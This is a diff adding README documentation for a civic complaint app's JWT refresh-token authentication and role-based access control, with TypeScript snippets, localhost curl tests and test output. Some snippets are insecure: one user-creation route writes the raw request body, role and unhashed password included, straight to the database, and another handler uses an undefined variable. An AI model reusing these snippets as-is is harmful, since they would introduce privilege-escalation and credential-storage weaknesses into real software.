+──────────────────────────────────────────────────
+✅ Logout successful
+   Refresh Token Cleared: Yes ✓
+
+🧪 Test 7: Access After Logout (Should Fail)
+──────────────────────────────────────────────────
+✅ Access correctly denied after logout
+   Error: Authentication required. No token provided.
+
+══════════════════════════════════════════════════
+📊 TEST SUMMARY
+══════════════════════════════════════════════════
+
+Total Tests: 7
+Passed: 7 ✅
+Failed: 0 ❌
+Success Rate: 100.0%
+
+🎉 All tests passed! Authentication flow is working correctly.
+```
+
+#### Manual Testing Steps
+
+**1. Test Login Flow:**
+
+```bash
+# Login request
+curl -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"user@example.com","password":"password123"}' \
+  -c cookies.txt \
+  -v
+
+# Response includes:
+# - accessToken in JSON body
+# - Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict
+```
+
+**2. Test Protected Route:**
+
+```bash
+# Use access token from login
+curl -X GET http://localhost:3000/api/auth/me \
+  -H "Authorization: Bearer {ACCESS_TOKEN}" \
+  -v
+
+# Should return user data
+```
+
+**3. Test Token Refresh:**
+
+```bash
+# Use refresh token cookie from login
+curl -X POST http://localhost:3000/api/auth/refresh \
+  -b cookies.txt \
+  -c cookies.txt \
+  -v
+
+# Response includes:
+# - New accessToken in JSON body
+# - New Set-Cookie: refreshToken (rotated)
+```
+
+**4. Test Logout:**
+
+```bash
+curl -X POST http://localhost:3000/api/auth/logout \
+  -b cookies.txt \
+  -v
+
+# Response clears refresh token cookie
+# Set-Cookie: refreshToken=; Max-Age=0
+```
+
+#### Browser DevTools Testing
+
+**1. Check Cookies:**
+- Open DevTools (F12)
+- Go to Application tab → Cookies
+- Verify `refreshToken` has:
+  - ✅ HttpOnly: true
+  - ✅ Secure: true (in production)
+  - ✅ SameSite: Strict
+
+**2. Check Network Requests:**
+- Go to Network tab
+- Login/signup
+- Verify response headers include:
+  ```
+  Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
+  ```
+
+**3. Test Auto-Refresh:**
+- Login to app
+- Open Console
+- Wait 16 minutes (access token expires after 15 min)
+- Make an API request
+- Verify console shows:
+  ```
+  Access token expired, attempting refresh...
+  Token refreshed successfully, retrying request...
+  ```
+
+### Environment Configuration
+
+**Required Environment Variables:**
+
+```bash
+# .env.local
+JWT_SECRET=your_super_secret_access_token_key_here_min_32_chars
+JWT_REFRESH_SECRET=your_super_secret_refresh_token_key_here_min_32_chars
+NODE_ENV=production
+```
+
+**Generate Secure Secrets:**
+
+```bash
+# Generate random 64-character secret
+node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
+```
+
+⚠️ **Security Warning:** NEVER commit `.env.local` to version control! Use strong, random secrets in production.
+
+### Key Achievements
+
+1. ✅ **Dual Token System** - Access (15 min) + Refresh (7 days) tokens
+2. ✅ **HTTP-Only Cookies** - Refresh tokens protected from XSS
+3. ✅ **Token Rotation** - New refresh token on each refresh
+4. ✅ **Auto-Refresh Logic** - Seamless token renewal on 401 errors
+5. ✅ **Security Headers** - XSS, CSRF, Clickjacking protection
+6. ✅ **CSRF Protection** - SameSite cookies + Origin validation
+7. ✅ **HTTPS Enforcement** - Strict Transport Security in production
+8. ✅ **Role-Based Access** - Middleware for admin routes
+9. ✅ **Comprehensive Testing** - Automated test script
+10. ✅ **Developer Experience** - Easy-to-use `withAuth` middleware
+
+### Best Practices
+
+1. **Use Strong Secrets** - Minimum 32 characters, random generation
+2. **Rotate Refresh Tokens** - Issue new token on every refresh
+3. **Short Access Token Lifespan** - 15 minutes or less
+4. **HTTP-Only Cookies** - Never store sensitive tokens in localStorage
+5. **HTTPS in Production** - Enforce secure transport
+6. **Validate Origin Headers** - Prevent CSRF attacks
+7. **Implement Rate Limiting** - Prevent brute force attacks (future)
+8. **Log Authentication Events** - Audit trail for security
+9. **Graceful Token Expiry** - Auto-refresh without user disruption
+10. **Security Headers** - Comprehensive defense-in-depth
+
+### Reflection: Why This Implementation Matters
+
+**Problem:** Simple JWT implementations often have critical security flaws:
+- Tokens stored in localStorage (XSS vulnerable)
+- Long-lived tokens (replay attack risk)
+- No token rotation (compromise persists)
+- Missing CSRF protection
+- Poor error handling (broken user experience)
+
+**Solution:** This implementation provides **production-grade security**:
+
+✅ **Defense in Depth:** Multiple layers of protection (HTTP-only cookies, short lifespans, rotation, CSRF headers)
+
+✅ **User Experience:** Seamless auto-refresh means users stay logged in without security compromise
+
+✅ **Developer Experience:** Simple `withAuth` middleware protects routes with one line of code
+
+✅ **Audit Trail:** Clear logging of authentication events for security monitoring
+
+✅ **Compliance Ready:** Follows OWASP recommendations and industry best practices
+
+**The difference between amateur and professional authentication:**
+- Amateur: Single long-lived token in localStorage → One XSS = Full account compromise
+- Professional: Dual token system with rotation + HTTP-only storage → Multiple layers of protection, limited blast radius
+
+This implementation ensures TTA-Urban can handle sensitive civic complaint data while maintaining user trust and regulatory compliance.
+
+---
+
+## 🛡️ Role-Based Access Control (RBAC)
+
+### Overview
+
+Role-Based Access Control (RBAC) is a security model that restricts system access based on user roles rather than individual identities. In TTA-Urban, RBAC ensures that users can only access features and data they're authorized to use, providing granular control over who can perform what actions.
+
+### Key Concepts
+
+**Role**: A named collection of permissions (e.g., Admin, Editor, Viewer)
+
+**Permission**: A specific action that can be performed on a resource (e.g., `CREATE_USER`, `DELETE_COMPLAINT`)
+
+**Resource**: An entity in the system (e.g., User, Complaint, Department, File)
+
+**Policy**: Rules that determine whether a role has access to perform an action on a resource
+
+### Role Hierarchy
+
+TTA-Urban implements a hierarchical role system where higher roles inherit capabilities from lower roles:
+
+```
+┌──────────────────────────────────────────────────┐
+│                    ADMIN                         │
+│  Level 4: Full system access                    │
+│  ✓ All permissions                              │
+│  ✓ User & role management                       │
+│  ✓ View audit logs                              │
+│  ✓ System configuration                         │
+└──────────────────────────────────────────────────┘
+                     ↑
+┌──────────────────────────────────────────────────┐
+│                   EDITOR                         │
+│  Level 3: Content management                    │
+│  ✓ Create & update resources                   │
+│  ✓ Read all data                                │
+│  ✗ Delete permissions limited                   │
+│  ✗ Cannot manage users/roles                    │
+└──────────────────────────────────────────────────┘
+                     ↑
+┌──────────────────────────────────────────────────┐
+│                    USER                          │
+│  Level 2: Standard authenticated access         │
+│  ✓ Create complaints                            │
+│  ✓ Read own data                                │
+│  ✓ Update own profile                           │
+│  ✗ Limited access to others' data               │
+└──────────────────────────────────────────────────┘
+                     ↑
+┌──────────────────────────────────────────────────┐
+│                   VIEWER                         │
+│  Level 1: Read-only access                     │
+│  ✓ Read permissions only                        │
+│  ✗ No create/update/delete                      │
+│  ✗ Minimal system interaction                   │
+└──────────────────────────────────────────────────┘
+```
+
+### Roles & Permissions Matrix
+
+| Role | Permissions | Use Case |
+|------|------------|----------|
+| **ADMIN** | • All CRUD operations on all resources<br>• User & role management (`MANAGE_ROLES`)<br>• View audit logs (`VIEW_AUDIT_LOGS`)<br>• System configuration (`MANAGE_SETTINGS`)<br>• Department management<br>• File management | System administrators who need complete control over the platform |
+| **EDITOR** | • Create/Read/Update users<br>• Create/Read/Update complaints<br>• Read/Update departments<br>• Create/Read/Update files<br>• ✗ Cannot delete users<br>• ✗ Cannot manage roles<br>• ✗ Cannot view audit logs | Municipal officers who process complaints and manage content but shouldn't have admin privileges |
+| **USER** | • Read/Update own profile<br>• Create complaints<br>• Read own complaints<br>• Read departments<br>• Create/Read own files<br>• ✗ Cannot access other users' data<br>• ✗ Cannot delete anything | Citizens who submit complaints and track their status |
+| **VIEWER** | • Read users<br>• Read complaints<br>• Read departments<br>• Read files<br>• ✗ No create/update/delete permissions | Observers, auditors, or stakeholders who need visibility without modification rights |
+
+### Permission Categories
+
+Permissions are organized by resource type:
+
+#### User Management
+- `CREATE_USER` - Create new user accounts
+- `READ_USER` - View user information
+- `UPDATE_USER` - Modify user details
+- `DELETE_USER` - Remove user accounts
+
+#### Complaint Management
+- `CREATE_COMPLAINT` - Submit new complaints
+- `READ_COMPLAINT` - View complaint details
+- `UPDATE_COMPLAINT` - Modify complaint status/details
+- `DELETE_COMPLAINT` - Remove complaints
+
+#### Department Management
+- `CREATE_DEPARTMENT` - Create new departments
+- `READ_DEPARTMENT` - View department information
+- `UPDATE_DEPARTMENT` - Modify department details
+- `DELETE_DEPARTMENT` - Remove departments
+
+#### File Management
+- `CREATE_FILE` - Upload files/attachments
+- `READ_FILE` - Download/view files
+- `UPDATE_FILE` - Modify file metadata
+- `DELETE_FILE` - Remove files
+
+#### Administrative Operations
+- `MANAGE_ROLES` - Assign and modify user roles
+- `VIEW_AUDIT_LOGS` - Access security audit logs
+- `MANAGE_SETTINGS` - Configure system settings
+
+### Implementation Architecture
+
+#### 1. Configuration Layer
+
+**File:** [app/config/roles.ts](./ttaurban/app/config/roles.ts)
+
+Centralized role and permission definitions:
+
+```typescript
+export enum Role {
+  ADMIN = 'admin',
+  EDITOR = 'editor',
+  VIEWER = 'viewer',
+  USER = 'user',
+}
+
+export enum Permission {
+  CREATE_USER = 'create:user',
+  READ_USER = 'read:user',
+  UPDATE_USER = 'update:user',
+  DELETE_USER = 'delete:user',
+  // ... more permissions
+}
+
+export const rolePermissions: Record<Role, Permission[]> = {
+  [Role.ADMIN]: [
+    Permission.CREATE_USER,
+    Permission.READ_USER,
+    Permission.UPDATE_USER,
+    Permission.DELETE_USER,
+    // ... all permissions
+  ],
+  [Role.EDITOR]: [
+    Permission.READ_USER,
+    Permission.UPDATE_USER,
+    Permission.CREATE_COMPLAINT,
+    // ... editor permissions
+  ],
+  // ... other roles
+};
+```
+
+#### 2. RBAC Utilities Layer
+
+**File:** [app/lib/rbac.ts](./ttaurban/app/lib/rbac.ts)
+
+Core RBAC logic and permission checking functions:
+
+```typescript
+/**
+ * Check if a role has a specific permission
+ */
+export function hasPermission(role: Role, permission: Permission): boolean {
+  const permissions = rolePermissions[role];
+  return permissions ? permissions.includes(permission) : false;
+}
+
+/**
+ * Check if user can access resource based on ownership
+ */
+export function canAccessResource(
+  user: RBACUser,
+  resourceOwnerId: string,
+  requiredPermission: Permission
+): boolean {
+  // Owner can always access their own resources
+  if (user.id === resourceOwnerId) {
+    return true;
+  }
+  
+  // Otherwise, check if user has the required permission
+  return hasPermission(user.role, requiredPermission);
+}
+
+/**
+ * Resource-based authorization helper
+ */
+export class ResourceAuthorizer {
+  constructor(private user: RBACUser) {}
+  
+  canRead(resourceOwnerId: string, resourceType: 'user' | 'complaint' | 'department' | 'file'): boolean {
+    const permissionMap = {
+      user: Permission.READ_USER,
+      complaint: Permission.READ_COMPLAINT,
+      department: Permission.READ_DEPARTMENT,
+      file: Permission.READ_FILE,
+    };
+    
+    return canAccessResource(this.user, resourceOwnerId, permissionMap[resourceType]);
+  }
+  
+  canUpdate(resourceOwnerId: string, resourceType: string): boolean { /* ... */ }
+  canDelete(resourceOwnerId: string, resourceType: string): boolean { /* ... */ }
+}
+```
+
+#### 3. Middleware Layer
+
+**File:** [app/lib/authMiddleware.ts](./ttaurban/app/lib/authMiddleware.ts)
+
+API route protection with automatic permission enforcement:
+
+```typescript
+/**
+ * Permission-based access control middleware
+ */
+export function withPermission(
+  permission: Permission,
+  handler: AuthenticatedHandler
+) {
+  return withAuth(async (req: NextRequest, user: JWTPayload) => {
+    const userRole = user.role as Role;
+    const allowed = hasPermission(userRole, permission);
+    
+    // Log the permission check
+    auditLogger.logPermissionCheck(
+      String(user.id),
+      user.email,
+      userRole,
+      permission,
+      allowed ? AuditResult.ALLOWED : AuditResult.DENIED,
+      allowed 
+        ? `Role '${userRole}' has permission '${permission}'` 
+        : `Role '${userRole}' lacks permission '${permission}'`,
+      { 
+        endpoint: req.nextUrl.pathname,
+        method: req.method,
+      }
+    );
+    
+    if (!allowed) {
+      return NextResponse.json(
+        {
+          success: false,
+          message: `Access denied. Required permission: ${permission}`,
+          error: "FORBIDDEN",
+          code: "PERMISSION_REQUIRED",
+        },
+        { status: 403 }
+      );
+    }
+
+    return await handler(req, user);
+  });
+}
+
+/**
+ * Role-based access control middleware
+ */
+export function withRole(
+  allowedRoles: Role[],
+  handler: AuthenticatedHandler
+) {
+  return withAuth(async (req: NextRequest, user: JWTPayload) => {
+    const userRole = user.role as Role;
+    const hasRole = allowedRoles.some(role => 
+      meetsRoleRequirement(userRole, role)
+    );
+    
+    // Log the role check
+    auditLogger.logRoleCheck(/* ... */);
+    
+    if (!hasRole) {
+      return NextResponse.json(
+        {
+          success: false,
+          message: `Insufficient permissions. Required role: ${allowedRoles.join(' or ')}`,
+          error: "FORBIDDEN",
+        },
+        { status: 403 }
+      );
+    }
+
+    return await handler(req, user);
+  });
+}
+```
+
+#### 4. API Route Protection
+
+**Example:** [app/api/users/route.ts](./ttaurban/app/api/users/route.ts)
+
+```typescript
+import { withPermission } from '@/app/lib/authMiddleware';
+import { Permission } from '@/app/config/roles';
+
+/**
+ * GET /api/users
+ * @requires Permission: READ_USER
+ */
+export const GET = withPermission(Permission.READ_USER, async (req, user) => {
+  // Only users with READ_USER permission can access this endpoint
+  const users = await prisma.user.findMany();
+  return NextResponse.json({ success: true, data: users });
+});
+
+/**
+ * POST /api/users
+ * @requires Permission: CREATE_USER
+ */
+export const POST = withPermission(Permission.CREATE_USER, async (req, user) => {
+  // Only users with CREATE_USER permission can create users
+  const newUser = await prisma.user.create({ data: await req.json() });
+  return NextResponse.json({ success: true, data: newUser }, { status: 201 });
+});
+```
+
+**Example:** [app/api/admin/stats/route.ts](./ttaurban/app/api/admin/stats/route.ts)
+
+```typescript
+import { withRole } from '@/app/lib/authMiddleware';
+import { Role } from '@/app/config/roles';
+
+/**
+ * GET /api/admin/stats
+ * @requires Role: ADMIN
+ */
+export const GET = withRole([Role.ADMIN], async (req, user) => {
+  // Only admins can access this endpoint
+  const stats = auditLogger.getStatistics();
+  return NextResponse.json({ success: true, data: stats });
+});
+```
+
+#### 5. Frontend UI Protection
+
+**File:** [components/RoleGuard.tsx](./ttaurban/components/RoleGuard.tsx)
+
+React components for role-based UI rendering:
+
+```tsx
+import { RoleGuard, AdminOnly, usePermission } from '@/components/RoleGuard';
+import { Role, Permission } from '@/app/config/roles';
+
+export default function Dashboard() {
+  const { hasPermission, hasRole } = usePermission();
+
+  return (
+    <div>
+      {/* Admin-only section */}
+      <AdminOnly fallback={<p>Access Denied</p>}>
+        <button onClick={deleteUser}>Delete User</button>
+      </AdminOnly>
+
+      {/* Permission-based rendering */}
+      <RoleGuard 
+        permissions={[Permission.CREATE_USER]}
+        fallback={<p>You cannot create users</p>}
+      >
+        <button onClick={createUser}>Create User</button>
+      </RoleGuard>
+
+      {/* Programmatic check */}
+      {hasPermission(Permission.DELETE_COMPLAINT) && (
+        <button onClick={deleteComplaint}>Delete Complaint</button>
+      )}
+
+      {/* Role-based rendering */}
+      {hasRole(Role.ADMIN) && (
+        <Link href="/admin">Admin Panel</Link>
+      )}
+    </div>
+  );
+}
+```
+
+**Hook Usage:**
+
+```tsx
+const { hasPermission, hasRole, hasAnyPermission, userRole } = usePermission();
+
+// Check single permission
+if (hasPermission(Permission.DELETE_USER)) {
+  // Show delete button
+}
+
+// Check role
+if (hasRole(Role.ADMIN)) {
+  // Show admin features
+}
+
+// Check multiple permissions (any)
+if (hasAnyPermission([Permission.UPDATE_USER, Permission.DELETE_USER])) {
+  // Show edit controls
+}
+```
+
+### Audit Logging
+
+**File:** [app/lib/auditLogger.ts](./ttaurban/app/lib/auditLogger.ts)
+
+Every authorization decision is logged for security auditing:
+
+```typescript
+export enum AuditAction {
+  PERMISSION_CHECK = 'PERMISSION_CHECK',
+  ROLE_CHECK = 'ROLE_CHECK',
+  RESOURCE_ACCESS = 'RESOURCE_ACCESS',
+  API_ACCESS = 'API_ACCESS',
+}
+
+export enum AuditResult {
+  ALLOWED = 'ALLOWED',
+  DENIED = 'DENIED',
+}
+
+// Automatic logging on every permission check
+auditLogger.logPermissionCheck(
+  userId,
+  userEmail,
+  userRole,
+  permission,
+  AuditResult.ALLOWED,
+  'Role admin has permission create:user'
+);
+```
+
+**Console Output Example:**
+
+```
+[RBAC AUDIT] 2025-12-27T10:30:45.123Z | User: admin@test.com (admin) | Action: PERMISSION_CHECK | Resource: create:user | Result: ALLOWED | Reason: Role 'admin' has permission 'create:user'
+
+[RBAC AUDIT] 2025-12-27T10:31:12.456Z | User: viewer@test.com (viewer) | Action: PERMISSION_CHECK | Resource: delete:user | Result: DENIED | Reason: Role 'viewer' lacks permission 'delete:user'
+
+[RBAC AUDIT] 2025-12-27T10:32:05.789Z | User: editor@test.com (editor) | Action: ROLE_CHECK | Resource: admin | Result: DENIED | Reason: User role 'editor' does not meet requirement: admin
+```
+
+**Audit Statistics:**
+
+```typescript
+const stats = auditLogger.getStatistics();
+
+console.log(stats);
+// Output:
+// {
+//   total: 1523,
+//   allowed: 1345,
+//   denied: 178,
+//   byAction: {
+//     PERMISSION_CHECK: 890,
+//     ROLE_CHECK: 456,
+//     RESOURCE_ACCESS: 177
+//   },
+//   byRole: {
+//     admin: 234,
+//     editor: 567,
+//     viewer: 345,
+//     user: 377
+//   }
+// }
+```
+
+### Policy Evaluation Flow
+
+```
+┌─────────────────────────────────────────────────────┐
+│         API Request with Authorization              │
+│   GET /api/users | Authorization: Bearer {token}    │
+└────────────────────┬────────────────────────────────┘
+                     │
+                     ↓
+┌─────────────────────────────────────────────────────┐
+│              1. Authentication Layer                │
+│         withAuth() - Verify JWT token               │
+│         Extract user: { id, email, role }           │
+└────────────────────┬────────────────────────────────┘
+                     │
+                     ↓
+┌─────────────────────────────────────────────────────┐
+│            2. Authorization Layer                   │
+│    withPermission(Permission.READ_USER)             │
+│                                                     │
+│    Check: Does role have permission?                │
+│    • Look up user.role in rolePermissions           │
+│    • Check if Permission.READ_USER is in list       │
+└────────────────────┬────────────────────────────────┘
+                     │
+                     ↓
+              ┌─────┴─────┐
+              │           │
+         ✓ ALLOWED   ✗ DENIED
+              │           │
+              ↓           ↓
+    ┌─────────────┐  ┌─────────────┐
+    │ 3a. Log     │  │ 3b. Log     │
+    │ Success     │  │ Denial      │
+    │ Green ✓     │  │ Red ✗       │
+    └──────┬──────┘  └──────┬──────┘
+           │                │
+           ↓                ↓
+    ┌─────────────┐  ┌─────────────┐
+    │ 4a. Execute │  │ 4b. Return  │
+    │ Handler     │  │ 403 Error   │
+    │             │  │ + Message   │
+    └──────┬──────┘  └─────────────┘
+           │
+           ↓
+    ┌─────────────┐
+    │ 5. Return   │
+    │ 200 Success │
+    │ + Data      │
+    └─────────────┘
+```
+
+### Testing Evidence
+
+#### Automated Test Script
+
+**File:** [test-rbac.js](./ttaurban/test-rbac.js)
+
+Comprehensive test suite covering all RBAC scenarios:
+
+```bash
+node test-rbac.js
+```
+
+**Test Output:**
+
+```
+🧪 Starting RBAC Tests...
+
+📝 Test Group: User Creation
+
+✓ PASS Create admin user
+  User created with email: admin@test.com
+✓ PASS Create editor user
+  User created with email: editor@test.com
+✓ PASS Create viewer user
+  User created with email: viewer@test.com
+✓ PASS Create user user
+  User created with email: user@test.com
+
+🔐 Test Group: Login & Token Generation
+
+✓ PASS Login as admin
+  Token received
+✓ PASS Login as editor
+  Token received
+✓ PASS Login as viewer
+  Token received
+✓ PASS Login as user
+  Token received
+
+🛡️ Test Group: Permission Checks - Admin Endpoints
+
+✓ PASS Admin accesses admin stats
+  Status: 200 - Access granted
+✓ PASS Editor accesses admin stats (should be denied)
+  Status: 403 - Correctly denied
+✓ PASS Viewer accesses admin stats (should be denied)
+  Status: 403 - Correctly denied
+
+📚 Test Group: Permission Checks - User Endpoints
+
+✓ PASS Admin reads users list
+  Status: 200
+✓ PASS Editor reads users list
+  Status: 200
+✓ PASS Viewer reads users list
+  Status: 200
+✓ PASS Regular user creates user (should be denied)
+  Status: 403
+✓ PASS Admin creates user
+  Status: 201
+
+🔍 Test Group: Auth Context Endpoints
+
+✓ PASS Get current user info (admin)
+  Status: 200 - Role: ADMIN
+✓ PASS Access protected route without token (should be denied)
+  Status: 401
+
+📊 Test Summary
+
+Total Tests: 18
+Passed: 18
+Failed: 0
+Success Rate: 100.0%
+
+🎉 All tests passed!
+```
+
+#### Manual Testing Examples
+
+**1. Test Admin Access:**
+
+```bash
+# Login as admin
+curl -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@test.com","password":"Admin123!"}' | jq .
+
+# Use admin token to access admin endpoint
+curl -X GET http://localhost:3000/api/admin/stats \
+  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq .
+
+# Expected: 200 OK with audit statistics
+```
+
+**2. Test Permission Denial:**
+
+```bash
+# Login as viewer
+curl -X POST http://localhost:3000/api/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"viewer@test.com","password":"Viewer123!"}' | jq .
+
+# Try to create user (should fail)
+curl -X POST http://localhost:3000/api/users \
+  -H "Authorization: Bearer {VIEWER_TOKEN}" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Test","email":"test@test.com","password":"Pass123!","role":"USER"}' | jq .
+
+# Expected: 403 Forbidden
+# {
+#   "success": false,
+#   "message": "Access denied. Required permission: create:user",
+#   "error": "FORBIDDEN",
+#   "code": "PERMISSION_REQUIRED"
+# }
+```
+
+**3. Test UI Demo:**
+
+Visit [http://localhost:3000/rbac-demo](http://localhost:3000/rbac-demo) to see interactive role-based UI rendering with different user roles.
+
+### Database Schema
+
+**File:** [prisma/schema.prisma](./ttaurban/prisma/schema.prisma)
+
+Updated User model with RBAC roles:
+
+```prisma
+enum UserRole {
+  ADMIN    // Full access to all resources
+  EDITOR   // Can create and modify content
+  VIEWER   // Read-only access
+  USER     // Standard authenticated user (default)
+  OFFICER  // Legacy role - maps to EDITOR
+  CITIZEN  // Legacy role - maps to USER
+}
+
+model User {
+  id                Int         @id @default(autoincrement())
+  name              String
+  email             String      @unique
+  password          String
+  phone             String?
+  role              UserRole    @default(USER)  // Default role for new users
+  createdAt         DateTime    @default(now())
+  updatedAt         DateTime    @updatedAt
+  
+  // Relations...
+}
+```
+
+### Migration Path
+
+To update the database with new roles:
+
+```bash
+# Create migration
+npx prisma migrate dev --name add_rbac_roles
+
+# Apply migration to production
+npx prisma migrate deploy
+```
+
+### Allow/Deny Decision Examples
+
+#### Example 1: Admin Deletes User
+
+```
+Request: DELETE /api/users/123
+User: admin@test.com (role: ADMIN)
+Permission Required: DELETE_USER
+
+Evaluation:
+1. JWT verified ✓
+2. User authenticated ✓
+3. Role: ADMIN
+4. Check rolePermissions[ADMIN]
+5. DELETE_USER in permissions list ✓
+
+Decision: ALLOW ✓
+Response: 200 OK - User deleted
+
+Audit Log:
+[RBAC AUDIT] 2025-12-27T10:45:12.345Z | User: admin@test.com (admin) | 
+Action: PERMISSION_CHECK | Resource: delete:user | Result: ALLOWED | 
+Reason: Role 'admin' has permission 'delete:user'
+```
+
+#### Example 2: Editor Tries to Delete User
+
+```
+Request: DELETE /api/users/123
+User: editor@test.com (role: EDITOR)
+Permission Required: DELETE_USER
+
+Evaluation:
+1. JWT verified ✓
+2. User authenticated ✓
+3. Role: EDITOR
+4. Check rolePermissions[EDITOR]
+5. DELETE_USER NOT in permissions list ✗
+
+Decision: DENY ✗
+Response: 403 Forbidden
+
+Audit Log:
+[RBAC AUDIT] 2025-12-27T10:46:23.456Z | User: editor@test.com (editor) | 
+Action: PERMISSION_CHECK | Resource: delete:user | Result: DENIED | 
+Reason: Role 'editor' lacks permission 'delete:user'
+```
+
+#### Example 3: User Reads Own Complaint
+
+```
+Request: GET /api/complaints/456
+User: user@test.com (role: USER, id: 789)
+Resource Owner: id: 789
+Permission Required: READ_COMPLAINT
+
+Evaluation:
+1. JWT verified ✓
+2. User authenticated ✓
+3. Check resource ownership: user.id === complaint.userId ✓
+4. Owner can always access own resources
+
+Decision: ALLOW ✓ (ownership bypass)
+Response: 200 OK - Complaint data
+
+Audit Log:
+[RBAC AUDIT] 2025-12-27T10:47:34.567Z | User: user@test.com (user) | 
+Action: RESOURCE_ACCESS | Resource: complaint:456 | Result: ALLOWED | 
+Reason: User is owner of resource
+```
+
+#### Example 4: Viewer Tries to Update Complaint
+
+```
+Request: PATCH /api/complaints/456
+User: viewer@test.com (role: VIEWER)
+Permission Required: UPDATE_COMPLAINT
+
+Evaluation:
+1. JWT verified ✓
+2. User authenticated ✓
+3. Role: VIEWER
+4. Check rolePermissions[VIEWER]
+5. UPDATE_COMPLAINT NOT in permissions list ✗
+
+Decision: DENY ✗
+Response: 403 Forbidden
+
+Audit Log:
+[RBAC AUDIT] 2025-12-27T10:48:45.678Z | User: viewer@test.com (viewer) | 
+Action: PERMISSION_CHECK | Resource: update:complaint | Result: DENIED | 
+Reason: Role 'viewer' lacks permission 'update:complaint'
+```
+
+### Scalability Considerations
+
+#### Current Design Strengths
+
+1. **Centralized Configuration** - All roles and permissions in one place
+2. **Compile-Time Type Safety** - TypeScript enums prevent typos
+3. **Audit Trail** - Complete logging of all access decisions
+4. **Separation of Concerns** - Clear layers (config, utils, middleware, UI)
+5. **Testable** - Pure functions make unit testing easy
+
+#### Future Enhancements
+
+**1. Database-Driven Roles (Dynamic Permissions)**
+
+Current: Roles hardcoded in `roles.ts`
+Future: Store roles/permissions in database
+
+```typescript
+// Dynamic permission loading
+const roles = await prisma.role.findMany({
+  include: { permissions: true }
+});
+
+// Allows runtime permission changes without code deployment
+```
+
+**2. Attribute-Based Access Control (ABAC)**
+
+Current: Simple role → permission mapping
+Future: Context-aware policies
+
+```typescript
+// Policy example
+const policy = {
+  resource: 'complaint',
+  action: 'update',
+  condition: (user, resource) => {
+    return user.id === resource.userId || 
+           user.department === resource.department ||
+           user.role === Role.ADMIN;
+  }
+};
+
+// More flexible than pure RBAC
+```
+
+**3. Permission Caching**
+
+Current: Permission checks on every request
+Future: Cache permission results
+
+```typescript
+// Cache user permissions for 15 minutes
+const cacheKey = `permissions:${user.id}`;
+const cachedPermissions = await redis.get(cacheKey);
+
+if (!cachedPermissions) {
+  const permissions = getRolePermissions(user.role);
+  await redis.setex(cacheKey, 900, JSON.stringify(permissions));
+}
+```
+
+**4. Fine-Grained Permissions**
+
+Current: Resource-level permissions (e.g., `UPDATE_USER`)
+Future: Field-level permissions
+
+```typescript
+const fieldPermissions = {
+  'user.role': [Role.ADMIN],
+  'user.email': [Role.ADMIN, Role.EDITOR],
+  'user.name': [Role.ADMIN, Role.EDITOR, Role.USER],
+};
+
+// Different roles can update different fields
+```
+
+**5. Time-Based Access Control**
+
+```typescript
+const hasTemporaryAccess = (user, resource, currentTime) => {
+  return user.temporaryPermissions.some(perm => 
+    perm.resource === resource &&
+    perm.expiresAt > currentTime
+  );
+};
+
+// Temporary elevated privileges for specific tasks
+```
+
+**6. Multi-Tenancy Support**
+
+```typescript
+interface TenantRBAC {
+  tenantId: string;
+  roles: Role[];
+  customPermissions: Permission[];
+}
+
+// Different organizations can have different role structures
+```
+
+### Reflection
+
+#### Why RBAC Matters
+
+**Problem:** Without RBAC, applications face:
+- Security risks (any user can perform any action)
+- Data breaches (unauthorized access to sensitive information)
+- Compliance violations (cannot prove access control)
+- Poor user experience (cluttered UI with irrelevant options)
+
+**Solution:** TTA-Urban's RBAC provides:
+
+✅ **Security by Default** - Every endpoint explicitly declares required permissions
+
+✅ **Least Privilege Principle** - Users get minimum permissions needed for their role
+
+✅ **Audit Trail** - Complete visibility into who accessed what and when
+
+✅ **Scalability** - Easy to add new roles or modify permissions
+
+✅ **Compliance** - Meets regulatory requirements for access control
+
+✅ **Developer Experience** - Simple `withPermission()` decorator protects routes
+
+✅ **User Experience** - UI automatically adapts to user's capabilities
+
+#### Comparison with Alternative Approaches
+
+| Approach | Pros | Cons | When to Use |
+|----------|------|------|-------------|
+| **No Access Control** | • Simple to implement<br>• Fast development | • ❌ Major security risk<br>• ❌ No compliance<br>• ❌ Data breaches | Never in production |
+| **Client-Side Only** | • Good UX<br>• Fast UI rendering | • ❌ Not secure (bypassable)<br>• ❌ False sense of security | Only as UX enhancement, not security |
+| **Simple Admin Flag** | • Easy to understand<br>• Quick to implement | • ❌ Not granular<br>• ❌ All-or-nothing access<br>• ❌ Hard to extend | Small apps with 2 roles |
+| **RBAC (Our Implementation)** | • ✅ Granular control<br>• ✅ Scalable<br>• ✅ Auditable<br>• ✅ Type-safe | • More complex setup<br>• Requires planning | Production apps (TTA-Urban) |
+| **ABAC (Future)** | • ✅ Most flexible<br>• ✅ Context-aware<br>• ✅ Dynamic policies | • Complex to implement<br>• Harder to debug | Enterprise systems |
+
+#### Real-World Impact
+
+**Scenario:** Municipal officer attempts to delete all complaints
+
+**Without RBAC:**
+```typescript
+// Any authenticated user can delete
+export async function DELETE(req, { params }) {
+  await prisma.complaint.delete({ where: { id: params.id } });
+  return NextResponse.json({ success: true });
+}
+
+// Result: Data loss, accountability nightmare
+```
+
+**With RBAC:**
+```typescript
+export const DELETE = withPermission(Permission.DELETE_COMPLAINT, async (req, user) => {
+  await prisma.complaint.delete({ where: { id: params.id } });
+  return NextResponse.json({ success: true });
+});
+
+// Result: Only authorized admins can delete
+// All attempts logged for audit
+// Unauthorized attempts denied with clear message
+```
+
+#### Key Achievements
+
+1. ✅ **Type-Safe Role System** - TypeScript enums prevent permission typos
+2. ✅ **Automatic Audit Logging** - Every access decision recorded with color-coded output
+3. ✅ **Hierarchical Roles** - Clear role structure with inheritance
+4. ✅ **Resource-Based Authorization** - Ownership checks in addition to permissions
+5. ✅ **Client-Side Guards** - React components automatically hide unauthorized UI
+6. ✅ **Comprehensive Testing** - 18 automated tests covering all scenarios
+7. ✅ **Developer-Friendly API** - Simple decorators (`withPermission`, `withRole`)
+8. ✅ **Centralized Configuration** - All permissions in one maintainable file
